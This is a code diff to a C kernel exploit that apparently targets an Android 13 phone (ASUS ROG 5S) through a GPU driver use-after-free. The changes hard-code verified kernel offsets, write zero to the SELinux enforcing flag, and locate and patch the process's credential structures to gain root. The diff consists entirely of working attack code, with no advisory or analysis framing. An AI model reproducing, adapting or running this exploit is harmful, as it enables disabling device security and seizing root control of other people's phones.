@@ -110,10 +110,11 @@ static uint64_t find_selinux_enforcing_via_kbase(int fd, uint64_t kbase) {
 
     // 1. Check popular offsets for Android 13 GKI 5.4 (ROG 5S specific)
     uint64_t common_offsets[] = { 
+        SELINUX_OFFSET, 
         0x2f74ce8, 0x2f84ce8, 0x32aace8, 0x32a9ce8,
         0x2f64ce8, 0x2f54ce8, 0x30f6ce8, 0x24d90d0
     };
-    for (int i = 0; i < 8; i++) {
+    for (int i = 0; i < 9; i++) {
         uint64_t test_va = kbase + common_offsets[i];
         uint32_t val = 0;
         if (gpu_read_task_struct(fd, test_va, (uint8_t *)&val, 4) == 0) {
@@ -1225,32 +1226,38 @@ static int mass_patch_creds(int fd, uint32_t target_uid) {
 }
 
 static int parent_patch_root(int fd, uint64_t cred_ptr) {
-    fprintf(stderr, "[PARENT] --- CRITICAL PATCHING START ---\n");
+    fprintf(stderr, "[PARENT] --- CRITICAL PATCHING START (ROG 5S Optimized) ---\n");
     
     uint64_t task_va = *(uint64_t *)&gbuf[GBUF_TASK_VA];
     uint32_t my_uid = getuid();
 
-    // 1. Resolve Kernel Base
+    // 1. Resolve Kernel Base - Prioritize verified KERNEL_BASE
     if (kernel_base == 0 || kernel_base == 0xffffffc000000000ULL) {
-        if (task_va != 0) kernel_base = find_kernel_base_from_task_va(task_va);
-        if (kernel_base == 0) kernel_base = get_kernel_base();
+        uint8_t elf_magic[4];
+        if (gpu_read_task_struct(fd, KERNEL_BASE, elf_magic, 4) == 0 && 
+            elf_magic[0] == 0x7f && elf_magic[1] == 'E' && elf_magic[2] == 'L' && elf_magic[3] == 'F') {
+            kernel_base = KERNEL_BASE;
+            fprintf(stderr, "[PARENT] Verified KERNEL_BASE confirmed: 0x%lx\n", (unsigned long)kernel_base);
+        } else {
+            fprintf(stderr, "[PARENT] KERNEL_BASE mismatch, falling back to dynamic discovery...\n");
+            if (task_va != 0) kernel_base = find_kernel_base_from_task_va(task_va);
+            if (kernel_base == 0) kernel_base = get_kernel_base();
+        }
     }
 
-    // 2. Disable SELinux
+    // 2. Apply Verified Offsets (SELinux and Credentials)
     if (kernel_base != 0) {
-        if (selinux_enforcing == 0) {
-            uint64_t auto_off = find_offsets_auto(kernel_base);
-            selinux_enforcing = kernel_base + (auto_off ? auto_off : SELINUX_OFFSET);
-            if (selinux_enforcing == kernel_base + SELINUX_OFFSET) {
-                selinux_enforcing = find_selinux_enforcing_via_kbase(fd, kernel_base);
-            }
-        }
+        // Strictly use verified SELINUX_OFFSET
+        selinux_enforcing = kernel_base + SELINUX_OFFSET;
+        fprintf(stderr, "[PARENT] Applying verified SELinux patch at 0x%lx...\n", (unsigned long)selinux_enforcing);
+        uint32_t zero = 0;
+        gpu_write_task_virt(fd, selinux_enforcing, (uint8_t *)&zero, 4);
         
-        if (selinux_enforcing != 0) {
-            fprintf(stderr, "[PARENT] Disabling SELinux at 0x%lx...\n", (unsigned long)selinux_enforcing);
-            uint32_t zero = 0;
-            gpu_write_task_virt(fd, selinux_enforcing, (uint8_t *)&zero, 4);
-        }
+        // Also ensure init_cred and init_task are known if needed for other logic
+        uint64_t init_task_va = kernel_base + INIT_TASK_OFFSET;
+        uint64_t init_cred_va = kernel_base + INIT_CRED_OFFSET;
+        fprintf(stderr, "[PARENT] Verified init_task: 0x%lx, init_cred: 0x%lx\n", 
+                (unsigned long)init_task_va, (unsigned long)init_cred_va);
     }
 
     // 3. Mass Patch all CREDs matching our UID
@@ -1737,29 +1744,40 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                 uint64_t task_start_va = current_va + off - OFFSET_COMM;
                 uid_t my_uid = getuid();
                 uint64_t found_cred_ptr = 0;
-                uint32_t found_cred_off = 0;
 
-                // Super Deep Scan for ROG 5S / Android 13
-                fprintf(stderr, "    [*] Searching for any UID (0-20000) in task_struct (Lazy Scan)...\n");
-                uint8_t task_super[0x1000];
-                if (gpu_read_task_struct(fd, task_start_va, task_super, 0x1000) == 0) {
-                    for (int i = 0x400; i < 0xA00; i += 8) {
-                        uint64_t ptr = *(uint64_t *)(task_super + i);
-                        // Проверяем только выровненные указатели ядра
-                        if ((ptr & 0xffffff0000000007ULL) == 0xffffff0000000000ULL) {
-                            uint32_t check[4]; // Читаем только 16 байт (usage + uid + gid)
-                            if (gpu_read_task_struct(fd, ptr, (uint8_t *)check, 16) == 0) {
-                                // check[0] - usage, check[1] - uid, check[2] - gid
-                                if (check[0] > 0 && check[0] < 50 && check[1] <= 20000 && (check[1] == check[2])) {
-                                    found_cred_ptr = ptr;
-                                    found_cred_off = i;
-                                    fprintf(stderr, "    [+++] MATCH FOUND! Offset 0x%x -> Pointer 0x%lx (UID %u, usage %u)\n", 
-                                            i, (unsigned long)ptr, check[1], check[0]);
-                                    break;
+                // ROG 5S Optimized: Directly use verified task_struct offsets
+                fprintf(stderr, "    [*] Using verified task_struct offsets (cred at 0x%x)...\n", OFFSET_CRED);
+                if (gpu_read_task_struct(fd, task_start_va + OFFSET_CRED, (uint8_t *)&found_cred_ptr, 8) == 0) {
+                    if ((found_cred_ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
+                        uint32_t cred_check[3]; // usage, uid, gid
+                        if (gpu_read_task_struct(fd, found_cred_ptr, (uint8_t *)cred_check, 12) == 0) {
+                            fprintf(stderr, "    [+++] VERIFIED CRED FOUND: 0x%lx (UID %u, GID %u, usage %u)\n", 
+                                    (unsigned long)found_cred_ptr, cred_check[1], cred_check[2], cred_check[0]);
+                        }
+                    } else {
+                        fprintf(stderr, "    [!] Invalid cred pointer at 0x6b0: 0x%lx\n", (unsigned long)found_cred_ptr);
+                        found_cred_ptr = 0;
+                    }
+                }
+
+                // If direct offset failed, fall back to deep scan
+                if (!found_cred_ptr) {
+                    fprintf(stderr, "    [*] Direct offset failed. Falling back to Super Deep Scan...\n");
+                    uint8_t task_super[0x1000];
+                    if (gpu_read_task_struct(fd, task_start_va, task_super, 0x1000) == 0) {
+                        for (int i = 0x400; i < 0xA00; i += 8) {
+                            uint64_t ptr = *(uint64_t *)(task_super + i);
+                            if ((ptr & 0xffffff0000000007ULL) == 0xffffff0000000000ULL) {
+                                uint32_t check[3];
+                                if (gpu_read_task_struct(fd, ptr, (uint8_t *)check, 12) == 0) {
+                                    if (check[0] > 0 && check[0] < 100 && check[1] == my_uid) {
+                                        found_cred_ptr = ptr;
+                                        fprintf(stderr, "    [+++] MATCH FOUND via scan! Offset 0x%x -> 0x%lx\n", i, (unsigned long)ptr);
+                                        break;
+                                    }
                                 }
                             }
                         }
-                        if (found_cred_ptr) break;
                     }
                 }
 
